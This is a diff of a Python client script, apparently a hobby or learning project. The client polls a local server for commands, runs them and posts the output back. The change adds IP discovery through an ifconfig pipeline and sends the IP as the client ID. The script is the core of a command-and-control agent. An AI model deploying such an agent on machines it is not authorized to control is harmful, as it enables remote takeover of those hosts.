@@ -9,9 +9,14 @@ SERVER_URL = "http://127.0.0.1:5000"
 
 # client reaches out to server to get told its ID
 def log_client():
-    response = requests.get(f"{SERVER_URL}/log-client")
+    # get ip
+    ip = subprocess.run("ifconfig | grep 129 | grep inet | awk '{print $2}'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
+    # hostname -I
+    response = requests.get(f"{SERVER_URL}/log-client", params={'client_id': ip}) # send ip
+
+    # response = requests.get(f"{SERVER_URL}/log-client")
     if response.status_code == 200:
-        return response.json()['client_id']
+        return response.json()['client_id'] # need server to return to the client what its ID is
     else:
         return None
 
@@ -31,15 +36,19 @@ def execute_command(cmd):
         return str(e)
 
 def main():
+    # client_id = log_client()
+    # print("!!!!!!!!!!CLIENT ID:", client_id)
     try:
-        # client_id = log_client()
-        client_id = "12345"
+        client_id = log_client()
+        print("!!!!!!!!!!CLIENT ID:", client_id) # get id by visiting server/log-client, which means that server runs log_client() and gives client an id
+        # does this mean that i need to make client send its ip first off without asking server for a command?
+        # client_id = "12345"
         while True:
             cmd = get_command()
             if cmd == "disconnect":
                 print("disconnected")
                 # make it send "client [client_id] disconnected"
-                requests.post(SERVER_URL, params={'client': client_id, 'status': 'disconnected'}) # this works too
+                requests.post(SERVER_URL, params={'client_id': client_id, 'status': 'disconnected'}) # this works too
                 break
             result = execute_command(cmd)
             requests.post(SERVER_URL, json={"result": result}, params={'client': client_id, 'status': 'connected'}) # this goes hard
